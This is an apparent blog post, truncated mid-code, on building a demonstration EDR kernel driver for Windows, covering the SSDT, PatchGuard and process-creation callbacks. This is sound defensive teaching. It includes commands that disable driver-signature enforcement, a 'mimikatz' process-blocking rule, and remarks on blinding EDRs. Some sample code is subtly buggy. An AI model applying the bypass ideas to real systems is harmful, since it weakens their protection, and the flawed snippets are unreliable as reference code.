{
    "brief": "First we will take a look at the history of anti-viruses, see how they worked and why they relied on a kernel driver, then we will see how to create a custom kernel driver and finally how to turn it into a almost fully working EDR.       ...        Its usage is fully documented and the function is pretty easy to use, all you need to do is to specify the path to the file you want to open as well as the desired access on it (read, write or append).       ...        This instruction is the one that will tell the CPU to switch from the user space to the kernel space and then jump on the kernel address where the NtCreateFile function is located in the kernel.       ...        In order to find the address of the function, it will need both the system call number, stored in the EAX register, and the SSDT.       ...        Because this structure is an index that contains a list of system call numbers as well as the location of the corresponding hexadecimal address of the function in the kernel:       ...        Once the kernel receives the request, it will request a driver (the hard disk driver in our case) to read the content of the file stored on the hard disk which, in the end, will allow notepad to print its content back to you.       ...        Looking back at the SSDT, it appears that if you modify the address of the kernel functions, you can basically redirect the code flow pretty much anywhere you want.       ...        This mechanism is the first one we are going to implement in our EDR, but before we get to that we will need a kernel driver and thus we’ll need to have a better understanding of what a driver is and how we can develop one.       ...        Before you start developing a driver, you will have to determine what your needs are and what your driver will be used for.       ...        In our case, sadly, we’ll need to develop a kernel driver (KMDF) since we will use kernel functions and to develop a driver we will need a development environment!       ...        To do so we’ll have to add the following key:       ...        // Creating the symlink that we will use to contact our driver status = IoCreateSymbolicLink( &symlinkName, // The symbolic link name &deviceName   // The device name );       ...        Now that the driver is running, let’s take a look at the content of a basic Windows kernel driver!       ...        If we take a look at content of the DriverEntry’s function, we can see that, apart from the DbgPrintEx functions used to print messages in dbgview, two functions are called:       ...        In our code, the routine is the following function:       ...        And that’s it, at this point we have got a working kernel driver.       ...        As we have seen before, function callbacks are functions that can be used by a driver to register what is called a kernel callback.       ...        Below you will find a schema that sums up the process of registering a function callback in order to monitor for process creation:       ...        For that reason, each and every EDR’s driver registers kernel callbacks in order to monitor process creation via the PsSetCreateProcessNotifyRoutine function.       ...        The first argument is a pointer to a routine that is going to be executed each time the driver receives a notification from the kernel while the second one specifies whether the callback should be registered or unregistered.       ...        In the following code, this routine is the CreateProcessNotifyRoutine function:       ...        Being aware of process creation sure is interesting but we need to develop logic that is going to allow our EDR to determine whether or not the target process should be created in the first place.       ...        The prototype for this function is the following:       ...        As an attacker these arrays are specifically interesting because if you can overwrite them or remove the pointers, you will basically be able to “blind” the EDR and thus prevent it from monitoring the system (and there is already a pretty cool tool that will allow you doing that, CheekyBlinder).       ...        At this point the only thing I wanted MyDumbEDR to be able to detect is binaries that attempt to inject shellcode into remote process using the following simple CreateRemoteThread technique:       ...        Both these agents will receive information from the driver via a named pipe which is an Internal Process Communication mechanism.       ...        if (isOpenProcessPresent && isVirtualAllocExPresent && isWriteProcessMemoryPresent && isCreateRemoteThreadPresent) { return TRUE; } else { return FALSE; } return FALSE; }       ...        printf(\"\\n\\n\"); } return 0; }       ...        To modify the flow of a function from NTDLL.dll, we simply need to parse the DLL, find the functions we want to hook and modify its code so that it jumps to the code of our EDR instead.       ...        Because the NtAllocateVirtualMemory is the function from NTDLL.dll that is used to allocate and protect a memory space.       ...        That’s the job of the RemoteInjector agent which receives, from the driver, the PID of the process in which to inject the DLL:       ...        // Opening the process with necessary privileges HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid); if (hProcess == NULL) { printf(\"Can't open handle, error: % lu\\n\", GetLastError()); return FALSE; } printf(\"\\tOpen handle on PID: %d\\n\", target_pid);       ...        Running all of that, we can see that the assembly code of the NtAllocateVirtualMemory function of the NTDLL.dll of a process that was injected is the following:       ...        As you can see the first assembly instruction of the hooked NtAllocateVirtualMemory function is a jmp which will redirect the code flow from the NTDLL.dll to the address “00007FFAA06A0FD6” which is… Our injected EDR’s DLL:       ...        Now that we have our two agents as well as the driver, we can compile them and launch the entire project to see it in action!       ...        Throughout this article we have seen how to develop a Windows driver, how to turn it into a EDR’s kernel driver and how to build a dummy EDR.       ...       ",
    "html_url": "https://sensepost.com/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/",
    "text": "TL;DR I wanted to better understand EDR’s so I built a dummy EDR and talk about it here.\n\nEDR (Endpoint Detection and Response) is a kind of security product that aims to detect abnormal activities being executed on a computer or a server.\n\nWhen looking for resources about how EDR’s work, I realised that, even if there is a lot of literature available about EDR’s, there aren’t many articles explaining how an EDR’s is architected and how the different components of a EDR are orchestrated. This article aims to demystify how EDR’s work while building a custom one that will implement a few techniques used by real EDR’s.\n\nFirst we will take a look at the history of anti-viruses, see how they worked and why they relied on a kernel driver, then we will see how to create a custom kernel driver and finally how to turn it into a almost fully working EDR.\n\nI/ Virus history\n\nIf we take a look at the timeline of computer viruses and worms we’ll learn that that the term “worm” was originally used by John von Neumann in an article called “Theory of self-reproducing automata” published in 1966. In this article, Neumann showed that, in theory, a program could be designed so that it is able to reproduce itself. For this work, Neumann was considered to be the theoretical “father” of computer virology.\n\nThe first ever working virus was called “The Creeper” and was created by Bob Thomas. This was the first known worm as it was able to replicate over the network (ARPANET) copying itself to remote systems. Although it is the first detected virus ever, its actions were benign since it only printed the message “I’M THE CREEPER. CATCH ME IF YOU CAN”:\n\nKnowing that such programs could be created, smart people started working on security products that would be able to remove them. For example the “Reaper” whose only purposes was to delete the Creeper from infected hosts by moving across the ARPANET. Technically the Reaper was a worm itself, but a good one sort of… This was the first anti-virus software but a lot more appeared in the late 1980s and they were all aiming the same goal: protecting computers from malware.\n\nII/ How did anti-virus protect computers ?\n\nBack in the 90s, antivirus products were able to detect viruses in two ways:\n\nVia a simple heuristics:\nWhat is the name of the binary ?\nWhat is in the metadata (strings, comments…)\n\n2. Via a signature which is calculated for each binary:\n\nWhen dropping the binary on disk, the anti-virus would check if its signature was known and categorised as malicious. If so, the binary was quarantined or deleted.\n\nFor obvious reasons this was not enough because all of these detection methods are based on information that an attacker can manipulate. If you are blocking binaries called mimikatz.exe, I will just rename it notmimikatz.exe. If you are blocking binaries that contain a specific string, I will strip it! If you are flagging the signature of the binary, I’ll change one byte in the binary and we are good to go. Static analysis was not enough.\n\nIn order to detect viruses in a more sophisticated way, it was necessary to be able to analyse the system dynamically and specifically be aware of:\n\nProcesses being created\nLibraries being loaded\nFiles being modified\nFunctions being called as well as the parameters they take\n\nIf we take a look at how operating systems are architected, we can see that they rely on two spaces:\n\nThe user space is where your processes live, where you manipulate a word file, where you call your friends on discord. Each process, running in the user space, has got its own execution environment which means that if discord crashes, word will still work. On the other side is the kernel space where the core of the operating system as well as services and drivers are running. Since the kernel space is where the kernel itself is running, it contains quite a bit of interesting information, stored in structures, useful to inspect. However, as you may have guesses, it is not possible for a user space program to access this information directly since the user space and kernel space are both isolated from each other:\n\nThe only way of accessing these specific structures directly is running code in the kernel space itself and the easiest way of doing that, is via a kernel driver.\n\nOne of the most heavily targeted structures was the SSDT (Service System Dispatch Table). To understand why, we need to take a look at what the operating system does when you try to open a file. As a user, opening a file is nothing exceptional, you just double click on the file and a program (let’s say notepad or word) would open the file for you. However in order to achieve such a task, the operating system had to go through quite a few steps which is described by the following schema:\n\nAs you can see, user applications mostly rely on the WinAPI which consists of a set of developper-friendly functions documented by Microsoft and exposed by multiple DLL’s such as kernel32.dll, user.dll or advapi.dll. So the first step to open a file, is to use the CreateFileA function exposed by the kernel32.dll, whose prototype is the following:\n\nHANDLE CreateFileA(\n    LPCSTR                lpFileName,\n    DWORD                 dwDesiredAccess,\n    DWORD                 dwShareMode,\n    LPSECURITY_ATTRIBUTES lpSecurityAttributes,\n    DWORD                 dwCreationDisposition,\n    DWORD                 dwFlagsAndAttributes,\n    HANDLE                hTemplateFile\n);\n\nIts usage is fully documented and the function is pretty easy to use, all you need to do is to specify the path to the file you want to open as well as the desired access on it (read, write or append). Looking at the execution flow of the CreateFileA function we’ll see that, ultimately, it will call another function, NtCreateFile, exposed by the NTDLL.dll and whose prototype is the following:\n\n__kernel_entry NTSTATUS NtCreateFile(\n    PHANDLE            FileHandle,\n    ACCESS_MASK        DesiredAccess,\n    POBJECT_ATTRIBUTES ObjectAttributes,\n    PIO_STATUS_BLOCK   IoStatusBlock,\n    PLARGE_INTEGER     AllocationSize,\n    ULONG              FileAttributes,\n    ULONG              ShareAccess,\n    ULONG              CreateDisposition,\n    ULONG              CreateOptions,\n    PVOID              EaBuffer,\n    ULONG              EaLength\n);\n\nAs you can see, the prototype of the NtCreateFile function is much more complicated than the one of the CreateFileA function. The reason is that the NTDLL.dll is in fact the user mode reflection of the functions exposed by the kernel itself. As such, the NTDLL.dll is going to add a few others parameters that are needed by the kernel to perform the task of opening a file which are not managed or controlled by the developer.\n\nOnce all these parameters are set, the program will have to request the kernel to open the file. That means that the program will have to call the NtCreateFile function exposed by the kernel itself. At the beginning of this article I mentioned that a user space process can not directly access the kernel space, and that is true! However they can request the kernel to perform specific tasks. To request an such action, you will need to trigger a specific mechanism called a system call.\n\nLooking at the disassembly of the NtCreateFile from the NTDLL.dll function we can see the following:\n\nTwo things are important. The first one is the second line:\n\nmov eax, 55h\n\nThis line moves the value 55 in the EAX register. This value, 55, is called a system call number. Each function from the NTDLL.dll is linked to a specific system call number that varies between the different version of the Windows operating system. The second important line is the syscall instruction itself:\n\nsyscall\n\nThis instruction is the one that will tell the CPU to switch from the user space to the kernel space and then jump on the kernel address where the NtCreateFile function is located in the kernel. The thing is, the CPU doesn’t know where the NtCreateFile function is located. In order to find the address of the function, it will need both the system call number, stored in the EAX register, and the SSDT. Why the SSDT ? Because this structure is an index that contains a list of system call numbers as well as the location of the corresponding hexadecimal address of the function in the kernel:\n\nFunction\tSystem call number\tKernel address pointer\nNtCreateFile\t55\t0x5ea54623\nNtCreateIRTimer\tab\t0x6bcd1576\n…\t…\t…\n\nSo when the CPU triggers the syscall, it looks into this structure for the syscall number 55 and jumps on the address linked to this system call number. The following schema sums up the entire process of opening a file on the Windows operating system:\n\nOnce the kernel receives the request, it will request a driver (the hard disk driver in our case) to read the content of the file stored on the hard disk which, in the end, will allow notepad to print its content back to you.\n\nLooking back at the SSDT, it appears that if you modify the address of the kernel functions, you can basically redirect the code flow pretty much anywhere you want. For that reason security tool authors started patching the SSDT in order to redirect calls to their own drivers so that they can analyse which functions are called together with their arguments:\n\nThis way, leveraging their own drivers, defenders were able to analyse system calls and determine whether or not it is legitimate or malicious.\n\nThe SSDT structure is simple, making manipulation of it relatively safe. However, modifying other more complicated kernel structures can be a perilous task. In kernel space, if the code you run is bugged, the entire kernel may crash. Moreover, if the code contains a logic bug or memory-based vulnerability (such as a stack overflow), an attacker could exploit them in order to run code directly in kernel space (as the most privileged user on the system). Lastly, if defenders are able to use kernel drivers to access the kernel and modify its behaviour, so can attackers with rootkits.\n\nIn order to protect the Operating System both from intrusive modifications made by an anti-virus and from attackers, Microsoft created KPP (Kernel Patch Protection) more commonly referred to as PatchGuard and released it with Windows XP/2003.\n\nPatchGuard is an active security mechanism that periodically checks the state of multiple critical Windows kernel structures. If one of these structures are modified by anything other than legitimate kernel code then PatchGuard emits a fatal system error (know as “bug check”) which will trigger a reboot of the computer:\n\nAs a result, PatchGuard was preventing modification of critical kernel structures from other components that the kernel itself. With the release of PatchGuard it was no longer possible for an anti-virus to hook the SSDT or any critical structures in the kernel:\n\nObviously security tool editors went mad since it basically disabled pretty much all of their tools and some of them even tried to sue Microsoft.\n\nTo solve this issue and allow security products to monitor the system again, Microsoft added new functions to its OS that rely on a new mechanism called a callback object. Below is the definition of a callback object given by Microsoft:\n\nBasically these functions allow a kernel driver to be notified by the kernel each time a specific action is processed. As such, it permits software (like an EDR) to dynamically monitor what is happening on the system.\n\nThis mechanism is the first one we are going to implement in our EDR, but before we get to that we will need a kernel driver and thus we’ll need to have a better understanding of what a driver is and how we can develop one.\n\nIII/ What is a driver ?\n\nA driver is defined as a component that provides a software interface to a hardware device. A typical driver example would be the keyboard driver which translates electrical signal received from your keyboard inputs into a character that will be printed on your screen:\n\nThere are a lot of different drivers used on a system, for example the Bluetooth driver, the keyboard driver, the mouse driver and even the network input/output driver that is responsible for translating electrical signals into network packets that can be understood by the system.\n\nIf you want to take a look at the drivers that are running on your system, you can use the WinObj.exe tool from the SysInternals toolkit:\n\nMicrosoft provides a lot of drivers samples on their Github repository if you want to take a look at what the code of a driver looks like. You’ll soon realise that developing a driver is pretty complicated. As mentioned before, the smallest memory bug will crash the driver and thus the kernel. Because of this Microsoft provides a few frameworks that makes kernel driver development easier.\n\nThe main framework is called WDF (Windows Driver Framework) and is composed of two different sub-frameworks:\n\nKMDF (Kernel-Mode Driver Framework)\nUMDF (User-Mode Driver Framework)\n\nBoth these drivers have their pro’s and con’s:\n\nFramework\tPro’s\tCon’s\nKMDF\tGives full access to the kernel\tIs difficult to develop\nUMDF\tIs easy to develop\tGives access to limited functions\n\nBefore you start developing a driver, you will have to determine what your needs are and what your driver will be used for. In our case, sadly, we’ll need to develop a kernel driver (KMDF) since we will use kernel functions and to develop a driver we will need a development environment!\n\nIV/ Setting up a development environment\n\nFirst things first, we will need to install Visual Studio, the SDK and the Windows Driver Kit. This is unfortunately a bit of a painful process, and depends on the version of Windows that you are running. At the time of this article, for Windows 10, you can follow this procedure in order to install every necessary component. Note even though it mentions Windows 11 it also works for Windows 10. Next we will have to install an additional Spectre library using the Visual Studio installer:\n\nAlternatively, if you don’t care about Spectre mitigations (which probably doesn’t matter for this test), or are having trouble with getting the versions right in Visual Studio, then you can disable it in the project properties.\n\nNext, in preparation for loading our own driver, we will disable the Operating Systems driver signing check. In an elevated command line prompt, type the following command:\n\nbcdedit /set testsigning on\nbcdedit -debug on\n\nThe reason why we need to do that is because since Windows 10 version 1507, it is no longer possible to load drivers that are not signed by Microsoft itself to help prevent rootkits. These commands simply disable the signing check and enable debug mode which will allow us to load our driver and debug it using WinDbg. Lastly we’ll need to enable the output of kernel messages to the debugger. To do so we’ll have to add the following key:\n\nHKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manage\\Debug Print Filter\n\nWith the value 0xf:\n\nNow reboot your computer. Open Visual Studio and create a new project “Kernel Mode Driver, Empty”:\n\nOnce created, you should get the following project structure:\n\nCreate a new source file, name it “driver.c” and add the following content (I’ll get back to what it does later):\n\n#include <Ntifs.h>\n#include <ntddk.h>\n#include <wdf.h>\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDumbEDR\"); // Driver device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDumbEDR\");        // Device symlink\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Initializing the driver\\n\");\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t    // Our driver object\n        0,\t\t\t\t\t    // Extra bytes needed (we don't need any)\n        &deviceName,            // The device name\n        FILE_DEVICE_UNKNOWN,    // The device type\n        0,\t\t\t\t\t    // Device characteristics (none)\n        FALSE,\t\t\t\t    // Sets the driver to not exclusive\n        &DeviceObject\t\t    // Pointer in which is stored the result of IoCreateDevice\n    );\n\n    if (!status) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Device creation failed\\n\");\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(\n        &symlinkName, // The symbolic link name\n        &deviceName   // The device name\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Symlink creation failed\\n\");\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    // Setting the unload routine to execute\n    DriverObject->DriverUnload = UnloadMyDumbEDR;\n\n    return status;\n}\n\nIn the project properties, go to “Linker > Command Line” and add the following option which is going to disable the integrity check:\n\nAt this point the environment is ready to build the driver. Compile the project and launch the following commands in a admin command line (obviously adjust paths and names as needed):\n\nsc.exe create MyDumbEDR type=kernel binPath=C:\\\\Users\\windev\\Desktop\\x64\\Debug\\MyDumbEDR.sys\nsc.exe start MyDumbEDR\n\nHere is the output you’ll receive on your command line:\n\nAnd if you have got dbgview opened you should see your driver saying hello:\n\nPerfect! Now that the driver is running, let’s take a look at the content of a basic Windows kernel driver!\n\nV/ Developping a Windows kernel driver\n\nA driver, like any binaries, is composed of a main function called a DriverEntry that has the following prototype:\n\nNTSTATUS DriverEntry(\n    PDRIVER_OBJECT  DriverObject,\n    PUNICODE_STRING RegistryPath\n);\n\nWith:\n\nDriverObject: a pointer to a structure that contains the driver’s information, below is the content of this structure:\n//0x150 bytes (sizeof)\nstruct _DRIVER_OBJECT\n{\n    SHORT Type;                                                                    //0x0\n    SHORT Size;                                                                    //0x2\n    struct _DEVICE_OBJECT* DeviceObject;                                           //0x8\n    ULONG Flags;                                                                   //0x10\n    VOID* DriverStart;                                                             //0x18\n    ULONG DriverSize;                                                              //0x20\n    VOID* DriverSection;                                                           //0x28\n    struct _DRIVER_EXTENSION* DriverExtension;                                     //0x30\n    struct _UNICODE_STRING DriverName;                                             //0x38\n    struct _UNICODE_STRING* HardwareDatabase;                                      //0x48\n    struct _FAST_IO_DISPATCH* FastIoDispatch;                                      //0x50\n    LONG (*DriverInit)(struct _DRIVER_OBJECT* arg1, struct _UNICODE_STRING* arg2); //0x58\n    VOID (*DriverStartIo)(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);         //0x60\n    VOID (*DriverUnload)(struct _DRIVER_OBJECT* arg1);                             //0x68\n    LONG (*MajorFunction[28])(struct _DEVICE_OBJECT* arg1, struct _IRP* arg2);     //0x70\n}; \nRegistryPath: a pointer to a unicode string containing the path to the driver’s parameters key which is usually located under the following registry key:\nHKLM:\\SYSTEM\\CurrentControlSet\\Service\n\nIf we take a look at content of the DriverEntry’s function, we can see that, apart from the DbgPrintEx functions used to print messages in dbgview, two functions are called:\n\nIoCreateDevice: used to create a device object representing our driver\nIoCreateSymbolicLink: used to create the symbolic link that we will use to contact our driver\n\nThese functions are the mandatory ones that we need to specify in order to load a driver on the system.\n\nThe second important line specifies a routine to run when the driver is unloaded:\n\nDriverObject->DriverUnload = UnloadMyDumbEDR;\n\nIn our code, the routine is the following function:\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nAs you can see this is the exact opposite of the loading routine, it deletes the device as well as the symbolic link. And that’s it, at this point we have got a working kernel driver. It does nothing yet but it runs so let’s implement one of the first mechanisms used by EDR’s to monitor the system: callback objects!\n\nVI/ Implement function callback\n\nAs we have seen before, function callbacks are functions that can be used by a driver to register what is called a kernel callback. The underlying idea of a kernel callback is that, each time a particular action is done on the system, the kernel will inform the driver that registered the callback, that an action is being performed.\n\nTo register such kernel callback, you can use a function callback that will allow you to monitor for specific events. The most well known function callbacks are:\n\nPsSetCreateProcessNotifyRoutine: used to monitor process creation\nPsSetLoadImageNotifyRoutine: used to monitor DLL loading\nPsSetThreadCreateNotifyRoutine: used to monitor thread creation\nObRegisterCallbacks: used to monitor calls to the OpenProcess, OpenThread and OpenDesktop functions\nCmRegisterCallbacks: used to monitor the creation, modification and deletion of a registry key.\nIoRegisterShutdown: monitor the shutdown of the computer?\nIoRegisterFsRegistrationChange: monitor the modification of a file\n\nBelow you will find a schema that sums up the process of registering a function callback in order to monitor for process creation:\n\nAs you can see, being aware of a process being created is very interesting and important information for an EDR. For that reason, each and every EDR’s driver registers kernel callbacks in order to monitor process creation via the PsSetCreateProcessNotifyRoutine function. It’s prototype is the following:\n\nNTSTATUS PsSetCreateProcessNotifyRoutine(\n    PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, // Pointer to the function to execute when a process is created\n    BOOLEAN                        Remove         // Whether the routine specified by NotifyRoutine should be added to or removed from the system's list of notification routines\n);\n\nPretty simple right? The first argument is a pointer to a routine that is going to be executed each time the driver receives a notification from the kernel while the second one specifies whether the callback should be registered or unregistered. In the following code, this routine is the CreateProcessNotifyRoutine function:\n\n#include <Ntifs.h>\n#include <ntddk.h>\n#include <wdf.h>\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDumbEDR\"); // Internal device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDumbEDR\");        // Symlink\n\n// handle incoming notifications about new/terminated processes\nvoid CreateProcessNotifyRoutine(HANDLE ppid, HANDLE pid, BOOLEAN create){\n    if (create){\n        PEPROCESS process = NULL;\n        PUNICODE_STRING processName = NULL;\n\n        // Retrieve process ID\n        PsLookupProcessByProcessId(pid, &process);\n\n        // Retrieve the process name from the EPROCESS structure\n        SeLocateProcessImageName(process, &processName);\n\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: %d (%wZ) launched.\\n\", pid, processName);\n    }\n    else{\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: %d got killed.\\n\", pid);\n    }\n}\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Unset the callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath){\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Initializing the driver\\n\");\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Setting the unload routine to execute\n    DriverObject->DriverUnload = UnloadMyDumbEDR;\n    \n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t   // our driver object,\n        0,\t\t\t\t\t   // no need for extra bytes,\n        &deviceName,           // the device name,\n        FILE_DEVICE_UNKNOWN,   // device type,\n        0,\t\t\t\t\t   // characteristics flags,\n        FALSE,\t\t\t\t   // not exclusive,\n        &DeviceObject\t\t   // the resulting pointer\n    );\n\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Device creation failed\\n\");\n        return status;\n    }\n\n    // Creating the symlink that we will use to contact our driver\n    status = IoCreateSymbolicLink(&symlinkName, &deviceName);\n    if (!NT_SUCCESS(status)) {\n        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Symlink creation failed\\n\");\n        IoDeleteDevice(DeviceObject);\n        return status;\n    }\n\n    PsSetCreateProcessNotifyRoutine(CreateProcessNotifyRoutine, FALSE);\n    \n    return STATUS_SUCCESS;\n}\n\nBuild the driver, launch it, open DbgView and spawn whatever process you want. If everything went well you should see debug messages in DbgView printing the PID, as well as the process name of the process being launched or killed:\n\nBeing aware of process creation sure is interesting but we need to develop logic that is going to allow our EDR to determine whether or not the target process should be created in the first place. To do this we will have to use the extended function of PsSetCreateProcessNotifyRoutine called PsSetCreateProcessNotifyRoutineEx. The prototype for this function is the following:\n\nNTSTATUS PsSetCreateProcessNotifyRoutineEx(\n    PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, // Pointer to the PCreateProcessNotifyRoutineEx structure\n    BOOLEAN                           Remove         // Whether or not we should add or remove the callback\n);\n\nAt first glance the functions PsSetCreateProcessNotifyRoutineEx and PsSetCreateProcessNotifyRoutine look identical but when we take a closer look at the first argument of the PsSetCreateProcessNotifyRoutineEx we can see that the structure is a little bit more complex:\n\nPCREATE_PROCESS_NOTIFY_ROUTINE PcreateProcessNotifyRoutine;\nvoid PcreateProcessNotifyRoutineEx(\n    PEPROCESS Process,                  // Pointer to the EPROCESS structure\n    HANDLE ProcessId,                   // Process PID\n    PPS_CREATE_NOTIFY_INFO CreateInfo   // Process structure containing information about the process being launched\n)\n\nThe third variable contains information about the process being launched such as its command line, its parent PID, its image filename and so on:\n\ntypedef struct _PS_CREATE_NOTIFY_INFO {\n    SIZE_T              Size;\n    union {\n        ULONG Flags;\n        struct {\n            ULONG FileOpenNameAvailable : 1;  //\n            ULONG IsSubsystemProcess : 1;     \n            ULONG Reserved : 30;\n        };\n    };\n    HANDLE              ParentProcessId;     // Parent PID\n    CLIENT_ID           CreatingThreadId;    // Thread id \n    struct _FILE_OBJECT *FileObject; \n    PCUNICODE_STRING    ImageFileName;       // Name of the binary\n    PCUNICODE_STRING    CommandLine;         // Arguments passed to the binary\n    NTSTATUS            CreationStatus;      // This variable holds whether or not the process should be created\n} PS_CREATE_NOTIFY_INFO, *PPS_CREATE_NOTIFY_INFO;\n\nWhat’s interesting here is the CreationStatus variable which is where the driver will store its decision (i.e., should we allow or deny the process creation). This variable can contain two values:\n\nSTATUS_SUCCESS: the driver informs the kernel that the process can be launched\nSTATUS_ACCESS_DENIED: the driver informs the kernel that the process can not be launched\n\nHere is the final implementation of the kernel callback mechanism on our dumb EDR:\n\n#include <Ntifs.h>\n#include <ntddk.h>\n#include <wdf.h>\n\n// Global variables\nUNICODE_STRING DEVICE_NAME = RTL_CONSTANT_STRING(L\"\\\\Device\\\\MyDumbEDR\"); // Internal device name\nUNICODE_STRING SYM_LINK = RTL_CONSTANT_STRING(L\"\\\\??\\\\MyDumbEDR\");        // Symlink\n\n// Handle incoming notifications about new/terminated processes\nvoid CreateProcessNotifyRoutine(PEPROCESS process, HANDLE pid, PPS_CREATE_NOTIFY_INFO createInfo) {\n    UNREFERENCED_PARAMETER(process);\n    UNREFERENCED_PARAMETER(pid);\n    \n    // Never forget this if check because if you don't, you'll end up crashing your Windows system ;P\n    if (createInfo != NULL) {\n        // Compare the command line of the launched process to the notepad string\n        if (wcsstr(createInfo->CommandLine->Buffer, L\"notepad\") != NULL){\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Process (%ws) allowed.\\n\", createInfo->CommandLine->Buffer);\n            // Process allowed\n            createInfo->CreationStatus = STATUS_SUCCESS;\n        }\n\n        // Compare the command line of the launched process to the mimikatz string\n        if (wcsstr(createInfo->CommandLine->Buffer, L\"mimikatz\") != NULL) {\n            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Process (%ws) denied.\\n\", createInfo->CommandLine->Buffer);\n            // Process denied\n            createInfo->CreationStatus = STATUS_ACCESS_DENIED;\n        }\n    }\n}\n\nvoid UnloadMyDumbEDR(_In_ PDRIVER_OBJECT DriverObject) {\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, \"MyDumbEDR: Unloading routine called\\n\");\n    // Unset the callback\n    PsSetCreateProcessNotifyRoutineEx(CreateProcessNotifyRoutine, TRUE);\n    // Delete the driver device \n    IoDeleteDevice(DriverObject->DeviceObject);\n    // Delete the symbolic link\n    IoDeleteSymbolicLink(&SYM_LINK);\n}\n\nNTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {\n    // Prevent compiler error in level 4 warnings\n    UNREFERENCED_PARAMETER(RegistryPath);\n\n    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, \"MyDumbEDR: Initializing the driver\\n\");\n\n    // Variable that will store the output of WinAPI functions\n    NTSTATUS status;\n\n    // Setting the unload routine to execute\n    DriverObject->DriverUnload = UnloadMyDumbEDR;\n\n    // Initializing a device object and creating it\n    PDEVICE_OBJECT DeviceObject;\n    UNICODE_STRING deviceName = DEVICE_NAME;\n    UNICODE_STRING symlinkName = SYM_LINK;\n    status = IoCreateDevice(\n        DriverObject,\t\t   // our driver object,\n        0,\t\t\t\t\t   // no need for extra bytes,\n        &deviceName,           // the device name,\n        FILE_DEVICE_UNKNOWN,   // device type,\n        0,\t\t\t\t\t   // characteristics flags,\n        FALSE,\t\t\t\t   // not exclusive,\n        &DeviceObject\t\t   // the resulting pointer\n    );\n\n    if 